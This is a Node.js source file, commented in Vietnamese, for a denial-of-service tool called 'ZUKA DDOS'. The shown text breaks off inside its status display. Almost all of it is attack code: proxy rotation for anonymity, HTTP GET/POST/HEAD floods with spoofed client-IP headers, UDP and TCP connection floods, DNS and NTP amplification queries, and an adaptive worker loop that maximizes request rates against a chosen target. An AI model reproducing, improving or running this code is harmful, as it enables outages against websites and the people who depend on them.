// ============================================================
// PHAN 1: HEADER & REQUIRE - ZUKA DDOS ULTIMATE v18.0 OPTIMIZED
// ============================================================

const net = require('net');
const tls = require('tls');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const dgram = require('dgram');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const dns = require('dns');
const cluster = require('cluster');
const readline = require('readline');
const { exec, spawn } = require('child_process');
const v8 = require('v8');

const VERSION = "18.0 - ZUKA OPTIMIZED";

// ============================================================
// PHAT HIEN MOI TRUONG
// ============================================================

const ENV = {
    cpuCores: os.cpus().length,
    totalRam: os.totalmem() / 1024 / 1024 / 1024,
    freeRam: os.freemem() / 1024 / 1024 / 1024,
    platform: os.platform(),
    arch: os.arch(),
    isAndroid: fs.existsSync('/storage/emulated/0/') || fs.existsSync('/sdcard/'),
    isTermux: fs.existsSync('/data/data/com.termux/files/usr/'),
    isLinux: os.platform() === 'linux',
    isWindows: os.platform() === 'win32',
    isMac: os.platform() === 'darwin',
    isMobile: false,
    recommendedThreads: 0,
    recommendedRate: 0,
    maxConnections: 0,
};

ENV.isMobile = ENV.isAndroid || ENV.isTermux || (ENV.totalRam < 4);

function calculateOptimalResources() {
    const isMobile = ENV.isMobile;
    const cores = ENV.cpuCores;
    const freeRamGB = ENV.freeRam;
    
    let optimalThreads;
    if (isMobile) {
        optimalThreads = Math.floor(Math.min(cores * 80, freeRamGB * 60, 1000));
    } else {
        optimalThreads = Math.floor(Math.min(cores * 300, freeRamGB * 150, 20000));
    }
    ENV.recommendedThreads = Math.max(10, optimalThreads);
    
    let rate;
    if (isMobile) {
        rate = Math.floor(ENV.recommendedThreads * 30);
    } else {
        rate = Math.floor(ENV.recommendedThreads * 100);
    }
    ENV.recommendedRate = Math.max(1000, Math.min(500000, rate));
    
    ENV.maxConnections = Math.floor(Math.min(ENV.recommendedThreads * 3, 50000));
    ENV.resourceUsage = 0.9;
}

calculateOptimalResources();

// ============================================================
// HIEN THI THONG TIN
// ============================================================

function showEnvironmentInfo() {
    console.log('\n' + '='.repeat(60));
    console.log('  ZUKA DDOS - TOI UU TAN CONG');
    console.log('='.repeat(60));
    console.log('  CPU          : ' + ENV.cpuCores + ' cores');
    console.log('  RAM tong     : ' + ENV.totalRam.toFixed(1) + ' GB');
    console.log('  RAM trong    : ' + ENV.freeRam.toFixed(1) + ' GB');
    console.log('  Thiet bi     : ' + (ENV.isMobile ? 'MOBILE' : 'PC'));
    console.log('-' .repeat(60));
    console.log('  LUONG TOI UU : ' + ENV.recommendedThreads);
    console.log('  TOC DO TOI DA: ' + ENV.recommendedRate.toLocaleString() + ' req/s');
    console.log('  KET NOI DA   : ' + ENV.maxConnections);
    console.log('  SU DUNG TAI NGUYEN : 90%');
    console.log('='.repeat(60) + '\n');
}

showEnvironmentInfo();

// Ignore errors
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError', 'EADDRNOTAVAIL', 'ECONNRESET', 'ECONNREFUSED', 'ENOTFOUND', 'ETIMEDOUT'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN'];

require("events").EventEmitter.defaultMaxListeners = 10000;
process.setMaxListeners(10000);

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code)) return false;
    if (e.message && ignoreNames.some(n => e.message.includes(n))) return false;
});

process.on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code)) return false;
    if (e.message && ignoreNames.some(n => e.message.includes(n))) return false;
});// ============================================================
// PHAN 2: CAU HINH & BIEN TOAN CUC
// ============================================================

const CONFIG = {
    target: null,
    targetHost: null,
    targetPort: 80,
    targetSSL: false,
    duration: 60,
    threads: ENV.recommendedThreads,
    rate: ENV.recommendedRate,
    proxyFile: 'proxies.txt',
    useProxy: false,
    attackMode: 'max', // max, http, udp, tcp, dns
    smartBypass: true,
    sslIgnore: true,
    debug: false,
    delay: 0,
    cookie: null,
    userAgent: null,
    randMethod: true,
    randPath: true,
    packetSize: ENV.isMobile ? 4096 : 8192,
    maxRetries: ENV.isMobile ? 2 : 3,
    keepAlive: false,
    batchSize: ENV.isMobile ? 30 : 100,
    resourceUsage: ENV.resourceUsage,
    adaptiveMode: true,
};

let running = false;
let workers = [];
let statsInterval = null;
let proxyPool = [];
let proxyIndex = 0;
let proxyStats = new Map();
let methodScores = {};
let methodHistory = {};
let totalRequests = 0;
let successRequests = 0;
let failedRequests = 0;
let totalBytes = 0;
let startTime = null;
let peakSpeed = 0;
let forceStop = false;
let adaptiveAdjustment = 0;

let statusBox = {
    visible: true,
    lines: [],
    lastUpdate: 0,
    updateInterval: 100,
};

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    terminal: true
});

function question(prompt) {
    return new Promise(resolve => {
        rl.question(prompt, resolve);
    });
}

function log(msg, level = 'I') {
    const time = new Date().toLocaleTimeString('vi-VN');
    const levelMap = { 'I': 'THONG TIN', 'S': 'THANH CONG', 'E': 'LOI', 'W': 'CANH BAO', 'U': 'SUPER', 'R': 'RESOURCE' };
    console.log(`[${time}] [${levelMap[level] || level}] ${msg}`);
}

function logError(msg) { log(msg, 'E'); }
function logSuccess(msg) { log(msg, 'S'); }
function logInfo(msg) { log(msg, 'I'); }
function logWarn(msg) { log(msg, 'W'); }

function parseTarget(input) {
    if (!input) return null;
    try {
        let url = input;
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
            url = 'http://' + url;
        }
        const parsed = new URL(url);
        return {
            hostname: parsed.hostname,
            port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
            protocol: parsed.protocol,
            path: parsed.pathname || '/'
        };
    } catch(e) {
        return null;
    }
}// ============================================================
// PHAN 3: HAM TIEN ICH - TOI GIAN
// ============================================================

function randomIP() {
    return Math.floor(Math.random()*255) + '.' + 
           Math.floor(Math.random()*255) + '.' + 
           Math.floor(Math.random()*255) + '.' + 
           Math.floor(Math.random()*255);
}

function randomUserAgent() {
    const list = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/132.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/132.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) Chrome/132.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) Version/17.5 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0',
    ];
    return list[Math.floor(Math.random() * list.length)];
}

function randomHeaders(host) {
    const ua = CONFIG.userAgent || randomUserAgent();
    const ip = randomIP();
    return {
        'Host': host,
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'close',
        'X-Forwarded-For': ip,
        'X-Real-IP': ip,
        'X-Client-IP': ip,
        'Referer': 'https://' + host + '/',
    };
}

function randomPayload(size) {
    const s = Math.min(size || CONFIG.packetSize, 8192);
    try {
        return crypto.randomBytes(s).toString('hex');
    } catch(e) {
        return 'A'.repeat(s);
    }
}

function randomTextPayload() {
    return 'A'.repeat(CONFIG.packetSize) + 'B'.repeat(CONFIG.packetSize);
}

function getPath() {
    const paths = ['/', '/index.html', '/api/v1/test', '/api/v2/data', '/admin', '/login', '/dashboard', '/wp-admin', '/wp-login.php', '/api/graphql', '/graphql', '/api/rest', '/rest/api', '/json', '/data.json', '/config', '/status', '/health', '/ping', '/test', '/debug', '/info', '/version'];
    const path = paths[Math.floor(Math.random() * paths.length)];
    return path + '?t=' + Date.now() + '&r=' + Math.random().toString(36).substring(7);
}

function randomMethod() {
    const methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE'];
    return methods[Math.floor(Math.random() * methods.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

let pathCache = [];
let pathCacheIndex = 0;
const PATH_CACHE_SIZE = ENV.isMobile ? 10 : 50;

function getCachedPath() {
    if (pathCache.length < PATH_CACHE_SIZE) {
        pathCache.push(getPath());
        return pathCache[pathCache.length - 1];
    }
    pathCacheIndex = (pathCacheIndex + 1) % PATH_CACHE_SIZE;
    pathCache[pathCacheIndex] = getPath();
    return pathCache[pathCacheIndex];
}// ============================================================
// PHAN 4: QUAN LY PROXY TOI GIAN
// ============================================================

function parseProxyLine(line) {
    line = line.trim();
    if (!line) return null;
    if (line.startsWith('#') || line.startsWith('//')) return null;
    
    let clean = line.replace(/^https?:\/\//, '').replace(/^socks[45]:\/\//, '');
    const parts = clean.split(':');
    if (parts.length >= 2) {
        const port = parseInt(parts[parts.length - 1]);
        if (!isNaN(port) && port > 0 && port < 65536) {
            const host = parts.slice(0, parts.length - 1).join(':');
            return { proxy: line, host: host, port: port, type: 'http' };
        }
    }
    return null;
}

function parseProxyText(text) {
    const lines = text.split('\n');
    const proxies = [];
    for (const line of lines) {
        const trimmed = line.trim();
        if (trimmed) {
            const p = parseProxyLine(trimmed);
            if (p) proxies.push(p);
        }
    }
    return proxies;
}

function checkProxyQualityFast(proxy) {
    return new Promise((resolve) => {
        if (!proxy || !proxy.host || !proxy.port) { resolve(null); return; }
        
        const start = Date.now();
        const socket = new net.Socket();
        socket.setTimeout(1500);
        let connected = false;
        
        socket.once('connect', () => {
            const latency = Date.now() - start;
            socket.destroy();
            connected = true;
            let score = 0;
            if (latency < 50) score = 100;
            else if (latency < 100) score = 90;
            else if (latency < 200) score = 80;
            else if (latency < 300) score = 70;
            else if (latency < 500) score = 60;
            else if (latency < 800) score = 50;
            else if (latency < 1200) score = 40;
            else if (latency < 1500) score = 30;
            else score = 20;
            resolve({ 
                proxy: proxy.proxy || (proxy.host + ':' + proxy.port), 
                host: proxy.host, 
                port: proxy.port, 
                latency: latency, 
                working: true, 
                score: score
            });
        });
        
        socket.once('error', () => { socket.destroy(); if (!connected) resolve(null); });
        socket.once('timeout', () => { socket.destroy(); if (!connected) resolve(null); });
        
        try { socket.connect(proxy.port, proxy.host); } catch(e) { resolve(null); }
    });
}

async function filterAllProxiesFull() {
    if (proxyPool.length === 0) {
        logWarn('Khong co proxy de loc');
        return;
    }
    
    const totalProxy = proxyPool.length;
    logInfo('Dang loc ' + totalProxy + ' proxy...');
    
    const proxyObjects = proxyPool.map(p => ({ host: p.host, port: p.port }));
    const working = [];
    let checked = 0;
    let startTimeFilter = Date.now();
    
    const batchSize = ENV.isMobile ? 30 : 100;
    const batches = [];
    for (let i = 0; i < proxyObjects.length; i += batchSize) {
        batches.push(proxyObjects.slice(i, i + batchSize));
    }
    
    for (let b = 0; b < batches.length; b++) {
        const batch = batches[b];
        const promises = batch.map(p => checkProxyQualityFast(p));
        const results = await Promise.allSettled(promises);
        
        for (const result of results) {
            if (result.status === 'fulfilled' && result.value && result.value.working) {
                working.push(result.value);
            }
            checked++;
        }
        
        const elapsed = (Date.now() - startTimeFilter) / 1000;
        const pct = Math.round((checked / totalProxy) * 100);
        process.stdout.write('\rDa kiem tra ' + checked + '/' + totalProxy + ' (' + pct + '%), tim thay ' + working.length + ' proxy hoat dong');
    }
    console.log('');
    
    const workingMap = new Map();
    for (const w of working) {
        workingMap.set(w.host + ':' + w.port, w);
    }
    
    for (const p of proxyPool) {
        const key = p.host + ':' + p.port;
        if (workingMap.has(key)) {
            const w = workingMap.get(key);
            p.working = true;
            p.score = w.score;
            p.latency = w.latency;
        } else {
            p.working = false;
            p.score = 0;
        }
    }
    
    proxyPool.sort((a, b) => (b.score || 0) - (a.score || 0));
    
    const elapsedTotal = (Date.now() - startTimeFilter) / 1000;
    logSuccess('Da loc xong ' + totalProxy + ' proxy trong ' + elapsedTotal.toFixed(1) + 's');
    logSuccess('Tim thay ' + working.length + '/' + totalProxy + ' proxy hoat dong');
}

function addManualProxies(proxyString) {
    const trimmed = proxyString.trim();
    if (!trimmed) return { added: 0, total: 0, invalid: 0, duplicates: 0 };
    
    const lines = trimmed.split(/[\n\r,]+/);
    let added = 0, invalid = 0, duplicates = 0;
    const existingKeys = new Set(proxyPool.map(p => p.host + ':' + p.port));
    
    for (const line of lines) {
        const clean = line.trim();
        if (!clean) continue;
        
        const p = parseProxyLine(clean);
        if (!p) {
            invalid++;
            continue;
        }
        
        const key = p.host + ':' + p.port;
        if (!existingKeys.has(key)) {
            proxyPool.push({
                host: p.host,
                port: p.port,
                type: p.type || 'http',
                working: false,
                score: 0,
                failCount: 0,
                latency: 0,
                source: 'manual',
                lastCheck: Date.now()
            });
            existingKeys.add(key);
            added++;
        } else {
            duplicates++;
        }
    }
    
    return { added: added, total: lines.length, invalid: invalid, duplicates: duplicates };
}

async function loadProxiesFromFile(filename) {
    try {
        if (!fs.existsSync(filename)) {
            logError('Khong tim thay file: ' + filename);
            return 0;
        }
        const content = fs.readFileSync(filename, 'utf8');
        const proxies = parseProxyText(content);
        if (proxies.length === 0) {
            logError('Khong co proxy hop le trong file');
            return 0;
        }
        logInfo('Doc ' + proxies.length + ' proxy tu file ' + filename);
        const proxyStrings = proxies.map(p => p.proxy || (p.host + ':' + p.port));
        const result = addManualProxies(proxyStrings.join('\n'));
        logSuccess('Da them ' + result.added + ' proxy');
        return result.added;
    } catch(e) {
        logError('Loi doc file: ' + e.message);
        return 0;
    }
}

function getBestProxy() {
    if (!CONFIG.useProxy) return null;
    if (proxyPool.length === 0) {
        CONFIG.useProxy = false;
        return null;
    }
    
    let working = proxyPool.filter(p => p.working && p.score > 30 && p.failCount < 5);
    
    if (working.length === 0) {
        working = proxyPool.filter(p => p.failCount < 10);
        if (working.length === 0) {
            for (const p of proxyPool) {
                p.failCount = 0;
                p.working = true;
            }
            working = proxyPool;
        }
    }
    
    return working[Math.floor(Math.random() * working.length)];
}

function getProxyStats() {
    const total = proxyPool.length;
    let working = 0;
    let avgScore = 0;
    let avgLatency = 0;
    
    for (const p of proxyPool) {
        if (p.working) working++;
        avgScore += (p.score || 0);
        avgLatency += (p.latency || 0);
    }
    
    return {
        total: total,
        working: working,
        avgScore: total > 0 ? (avgScore / total).toFixed(1) : 0,
        avgLatency: total > 0 ? (avgLatency / total).toFixed(0) : 0,
        quality: total > 0 ? (working / total * 100) : 0
    };
}

function updateProxyPerformance(proxy, success) {
    if (!proxy) return;
    const key = proxy.host + ':' + proxy.port;
    if (!proxyStats.has(key)) {
        proxyStats.set(key, { total: 0, success: 0, fails: 0 });
    }
    const perf = proxyStats.get(key);
    perf.total++;
    if (success) {
        perf.success++;
        proxy.failCount = Math.max(0, (proxy.failCount || 0) - 1);
    } else {
        perf.fails++;
        proxy.failCount = (proxy.failCount || 0) + 1;
        if (proxy.failCount > 10) {
            proxy.working = false;
            proxy.score = Math.max(10, (proxy.score || 0) - 10);
        }
    }
    if (perf.total > 20) {
        const rate = perf.success / perf.total;
        proxy.score = Math.max(10, Math.min(100, rate * 100));
    }
}// ============================================================
// PHAN 5: CAC PHUONG THUC TAN CONG MANH NHAT
// ============================================================

// 1. HTTP FLOOD - MẠNH NHẤT CHO LỚP 7
function httpFlood(host, port) {
    return new Promise((resolve) => {
        const useHttps = port === 443 || port === 8443;
        const client = useHttps ? https : http;
        const headers = randomHeaders(host);
        const targetPath = getCachedPath();
        const method = CONFIG.randMethod ? randomMethod() : 'GET';
        
        if (CONFIG.cookie) headers['Cookie'] = CONFIG.cookie;
        headers['Connection'] = 'close';
        
        const options = {
            hostname: host,
            port: port,
            path: targetPath + '&_=' + Date.now() + '&r=' + randstr(4),
            method: method,
            headers: headers,
            rejectUnauthorized: false,
            timeout: 500,
            family: 4,
        };
        
        if (useHttps && CONFIG.sslIgnore) {
            options.rejectUnauthorized = false;
        }
        
        const proxy = getBestProxy();
        if (proxy && CONFIG.useProxy) {
            options.host = proxy.host;
            options.port = proxy.port;
            options.path = 'http' + (useHttps ? 's' : '') + '://' + host + ':' + port + targetPath;
            options.headers['Host'] = host;
        }
        
        try {
            const req = client.request(options);
            req.on('error', () => {});
            req.on('timeout', () => { req.destroy(); });
            req.end();
            totalRequests++;
            resolve(true);
        } catch(e) {
            failedRequests++;
            totalRequests++;
            resolve(false);
        }
    });
}

// 2. HTTP POST - GỬI DỮ LIỆU LỚN
function httpPostFlood(host, port) {
    return new Promise((resolve) => {
        const useHttps = port === 443 || port === 8443;
        const client = useHttps ? https : http;
        const headers = randomHeaders(host);
        const body = randomTextPayload();
        const targetPath = getCachedPath();
        
        headers['Content-Length'] = Buffer.byteLength(body);
        headers['Content-Type'] = 'application/x-www-form-urlencoded';
        headers['Connection'] = 'close';
        
        const options = {
            hostname: host,
            port: port,
            path: targetPath + '&_=' + Date.now(),
            method: 'POST',
            headers: headers,
            rejectUnauthorized: false,
            timeout: 500,
            family: 4,
        };
        
        if (useHttps && CONFIG.sslIgnore) {
            options.rejectUnauthorized = false;
        }
        
        const proxy = getBestProxy();
        if (proxy && CONFIG.useProxy) {
            options.host = proxy.host;
            options.port = proxy.port;
            options.path = 'http' + (useHttps ? 's' : '') + '://' + host + ':' + port + targetPath;
            options.headers['Host'] = host;
        }
        
        try {
            const req = client.request(options);
            req.on('error', () => {});
            req.on('timeout', () => { req.destroy(); });
            req.write(body);
            req.end();
            totalRequests++;
            resolve(true);
        } catch(e) {
            failedRequests++;
            totalRequests++;
            resolve(false);
        }
    });
}

// 3. HTTP HEAD - NHẸ NHƯNG NHIỀU REQUEST
function httpHeadFlood(host, port) {
    return new Promise((resolve) => {
        const useHttps = port === 443 || port === 8443;
        const client = useHttps ? https : http;
        const headers = randomHeaders(host);
        const targetPath = getCachedPath();
        
        headers['Connection'] = 'close';
        
        const options = {
            hostname: host,
            port: port,
            path: targetPath + '&_=' + Date.now(),
            method: 'HEAD',
            headers: headers,
            rejectUnauthorized: false,
            timeout: 500,
            family: 4,
        };
        
        if (useHttps && CONFIG.sslIgnore) {
            options.rejectUnauthorized = false;
        }
        
        const proxy = getBestProxy();
        if (proxy && CONFIG.useProxy) {
            options.host = proxy.host;
            options.port = proxy.port;
            options.path = 'http' + (useHttps ? 's' : '') + '://' + host + ':' + port + targetPath;
            options.headers['Host'] = host;
        }
        
        try {
            const req = client.request(options);
            req.on('error', () => {});
            req.on('timeout', () => { req.destroy(); });
            req.end();
            totalRequests++;
            resolve(true);
        } catch(e) {
            failedRequests++;
            totalRequests++;
            resolve(false);
        }
    });
}

// 4. UDP FLOOD - LỚP 4
function udpFlood(host, port) {
    return new Promise((resolve) => {
        try {
            const sock = dgram.createSocket('udp4');
            sock.setBroadcast(true);
            const data = Buffer.alloc(CONFIG.packetSize, 'A');
            const packets = Math.min(ENV.isMobile ? 10 : 30, CONFIG.threads);
            
            for (let i = 0; i < packets; i++) {
                sock.send(data, 0, data.length, port, host, () => {
                    totalRequests++;
                });
            }
            
            setTimeout(() => {
                sock.close();
                resolve(true);
            }, 20);
        } catch(e) {
            resolve(false);
        }
    });
}

// 5. TCP SYN - LỚP 4
function tcpSynFlood(host, port) {
    return new Promise((resolve) => {
        const connections = Math.min(ENV.isMobile ? 5 : 15, Math.floor(CONFIG.threads / 10) + 1);
        let done = 0;
        
        for (let i = 0; i < connections; i++) {
            try {
                const socket = net.createConnection(port, host, () => {
                    socket.write(Buffer.alloc(CONFIG.packetSize, 'A'));
                    socket.destroy();
                    totalRequests++;
                    done++;
                    if (done === connections) resolve(true);
                });
                
                socket.setTimeout(300);
                socket.on('error', () => {
                    failedRequests++; totalRequests++; done++;
                    if (done === connections) resolve(true);
                });
                socket.on('timeout', () => {
                    socket.destroy();
                    failedRequests++; totalRequests++; done++;
                    if (done === connections) resolve(true);
                });
            } catch(e) {
                failedRequests++; totalRequests++; done++;
                if (done === connections) resolve(true);
            }
        }
    });
}

// 6. DNS AMPLIFICATION - MẠNH VỚI DNS SERVER
function dnsAmplification(host) {
    return new Promise((resolve) => {
        try {
            const sock = dgram.createSocket('udp4');
            const domains = ['google.com', 'facebook.com', 'youtube.com', 'yahoo.com', 'bing.com'];
            const domain = domains[Math.floor(Math.random() * domains.length)];
            
            const query = Buffer.from([0x00, 0x01, 0x01, 0x00, 0x00, 0x01]);
            const parts = domain.split('.');
            for (const part of parts) {
                query.push(part.length);
                for (let i = 0; i < part.length; i++) {
                    query.push(part.charCodeAt(i));
                }
            }
            query.push(0x00, 0x00, 0x01, 0x00, 0x01);
            
            const packets = Math.min(ENV.isMobile ? 5 : 10, Math.floor(CONFIG.threads / 20) + 1);
            let sent = 0;
            
            for (let i = 0; i < packets; i++) {
                sock.send(query, 0, query.length, 53, host, () => {
                    totalRequests++;
                    sent++;
                    if (sent === packets) { sock.close(); resolve(true); }
                });
            }
            
            setTimeout(() => { sock.close(); resolve(true); }, 20);
        } catch(e) {
            resolve(false);
        }
    });
}

// 7. NTP AMPLIFICATION
function ntpAmplification(host) {
    return new Promise((resolve) => {
        try {
            const sock = dgram.createSocket('udp4');
            const query = Buffer.from([
                0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            ]);
            
            const packets = Math.min(ENV.isMobile ? 5 : 10, Math.floor(CONFIG.threads / 20) + 1);
            let sent = 0;
            
            for (let i = 0; i < packets; i++) {
                sock.send(query, 0, query.length, 123, host, () => {
                    totalRequests++;
                    sent++;
                    if (sent === packets) { sock.close(); resolve(true); }
                });
            }
            
            setTimeout(() => { sock.close(); resolve(true); }, 20);
        } catch(e) {
            resolve(false);
        }
    });
}// ============================================================
// PHAN 6: WORKER TOI UU - CHI DUNG PHUONG THUC MANH
// ============================================================

// CHỈ GIỮ LẠI CÁC PHƯƠNG THỨC MẠNH NHẤT
const ATTACK_FUNCTIONS = {
    'http': httpFlood,
    'http-post': httpPostFlood,
    'http-head': httpHeadFlood,
    'udp': udpFlood,
    'tcp': tcpSynFlood,
    'dns': dnsAmplification,
    'ntp': ntpAmplification,
};

const METHOD_NAMES = ['http', 'http-post', 'http-head', 'udp', 'tcp', 'dns', 'ntp'];

const MODE_MAP = {
    'max': ['http', 'http-post', 'udp', 'tcp', 'dns', 'ntp'],
    'http': ['http', 'http-post', 'http-head'],
    'udp': ['udp'],
    'tcp': ['tcp'],
    'dns': ['dns', 'ntp'],
    'all': METHOD_NAMES
};

function getBestMethod() {
    const available = MODE_MAP[CONFIG.attackMode] || MODE_MAP['max'];
    if (available.length === 0) return 'http';
    let best = available[0];
    let bestScore = -1;
    for (const m of available) {
        const score = methodScores[m] || (50 + Math.random() * 30);
        if (score > bestScore) {
            bestScore = score;
            best = m;
        }
    }
    return best;
}

function updateMethodScore(method, success) {
    if (!method) return;
    if (!methodHistory[method]) {
        methodHistory[method] = { total: 0, success: 0 };
    }
    methodHistory[method].total++;
    if (success) methodHistory[method].success++;
    if (methodHistory[method].total > 3) {
        const rate = methodHistory[method].success / methodHistory[method].total;
        methodScores[method] = rate * 100 + Math.random() * 5;
    } else {
        methodScores[method] = (methodScores[method] || 50) + (success ? 8 : -5);
    }
    methodScores[method] = Math.max(10, Math.min(100, methodScores[method]));
}

function getMethodsForWorker() {
    const available = MODE_MAP[CONFIG.attackMode] || MODE_MAP['max'];
    if (CONFIG.attackMode === 'max' || CONFIG.attackMode === 'all') {
        const count = Math.min(3, available.length);
        const shuffled = available.slice();
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }
        return shuffled.slice(0, count);
    }
    return [available[Math.floor(Math.random() * available.length)]];
}

function executeAttack(methodName, host, port) {
    return new Promise((resolve) => {
        const attackFn = ATTACK_FUNCTIONS[methodName];
        if (!attackFn) {
            resolve({ success: false, responseTime: 0, method: methodName });
            return;
        }
        try {
            const start = Date.now();
            attackFn(host, port).then((success) => {
                const responseTime = Date.now() - start;
                updateMethodScore(methodName, success);
                resolve({ success, responseTime, method: methodName });
            });
        } catch(e) {
            updateMethodScore(methodName, false);
            resolve({ success: false, responseTime: 0, method: methodName });
        }
    });
}

// WORKER TỐI ƯU
function optimizedWorker(id) {
    return new Promise((resolve) => {
        let consecutiveErrors = 0;
        let lastTime = Date.now();
        let requestCount = 0;
        let targetRate = CONFIG.rate || ENV.recommendedRate;
        
        const host = CONFIG.targetHost;
        const port = CONFIG.targetPort || 80;
        
        if (!host) {
            resolve();
            return;
        }
        
        let currentBatchSize = CONFIG.batchSize || ENV.recommendedBatchSize;
        
        const loop = () => {
            if (!running || forceStop) {
                resolve();
                return;
            }
            
            try {
                const adjustment = adaptiveAdjustment || 0;
                const adjustedBatch = Math.max(1, Math.floor(currentBatchSize * (1 + adjustment * 0.2)));
                const finalBatch = Math.min(adjustedBatch, ENV.isMobile ? 50 : 200);
                
                const methods = getMethodsForWorker();
                const promises = [];
                
                for (let i = 0; i < finalBatch; i++) {
                    const methodName = methods[Math.floor(Math.random() * methods.length)];
                    const attackFn = ATTACK_FUNCTIONS[methodName];
                    if (attackFn) {
                        promises.push(attackFn(host, port));
                    }
                }
                
                if (promises.length > 0) {
                    Promise.allSettled(promises).then((results) => {
                        let anySuccess = false;
                        for (const r of results) {
                            if (r.status === 'fulfilled' && r.value) {
                                anySuccess = true;
                                break;
                            }
                        }
                        if (anySuccess) {
                            consecutiveErrors = Math.max(0, consecutiveErrors - 1);
                        } else {
                            consecutiveErrors++;
                        }
                    });
                }
                
                requestCount += promises.length;
                const now = Date.now();
                if (now - lastTime > 1000) {
                    const speed = requestCount / ((now - lastTime) / 1000);
                    if (speed > peakSpeed) peakSpeed = speed;
                    requestCount = 0;
                    lastTime = now;
                }
                
                if (consecutiveErrors > 10) {
                    setTimeout(loop, 1);
                } else {
                    setImmediate(loop);
                }
            } catch(e) {
                consecutiveErrors++;
                setImmediate(loop);
            }
        };
        
        loop();
    });
}

function getSystemResources() {
    const memUsage = (os.totalmem() - os.freemem()) / os.totalmem();
    const cpuUsage = os.loadavg()[0] / ENV.cpuCores;
    return {
        memUsage: Math.min(1, memUsage),
        cpuUsage: Math.min(1, cpuUsage),
        loadAvg: os.loadavg()[0],
    };
}

function getOptimalWorkerCount() {
    const base = CONFIG.threads || ENV.recommendedThreads;
    const adjustment = 1 + adaptiveAdjustment;
    return Math.floor(Math.min(base * adjustment, ENV.recommendedThreads * 1.5, 50000));
}// ============================================================
// PHAN 7: START/STOP & HOP THOAI TRANG THAI
// ============================================================

let resourceMonitorInterval = null;

function startResourceMonitor() {
    if (resourceMonitorInterval) {
        clearInterval(resourceMonitorInterval);
    }
    
    resourceMonitorInterval = setInterval(() => {
        if (!running) return;
        
        const resources = getSystemResources();
        const targetUsage = CONFIG.resourceUsage || 0.9;
        const currentUsage = Math.max(resources.cpuUsage, resources.memUsage);
        
        if (currentUsage > targetUsage + 0.1) {
            const reduction = Math.max(0.05, (currentUsage - targetUsage) * 2);
            adaptiveAdjustment = Math.max(-0.3, adaptiveAdjustment - reduction);
        } else if (currentUsage < targetUsage - 0.05 && running) {
            const increase = Math.min(0.1, (targetUsage - currentUsage) * 0.3);
            adaptiveAdjustment = Math.min(0.3, adaptiveAdjustment + increase);
        }
        
        adaptiveAdjustment = Math.max(-0.3, Math.min(0.3, adaptiveAdjustment));
    }, 3000);
}

function stopResourceMonitor() {
    if (resourceMonitorInterval) {
        clearInterval(resourceMonitorInterval);
        resourceMonitorInterval = null;
    }
}

function createStatusBox() {
    const elapsed = (Date.now() - startTime) / 1000;
    if (elapsed <= 0) return;
    
    const speed = totalRequests / elapsed;
    const rate = totalRequests > 0 ? (successRequests / totalRequests * 100).toFixed(1) : 0;
    const mb = (totalBytes / 1024 / 1024).toFixed(1);
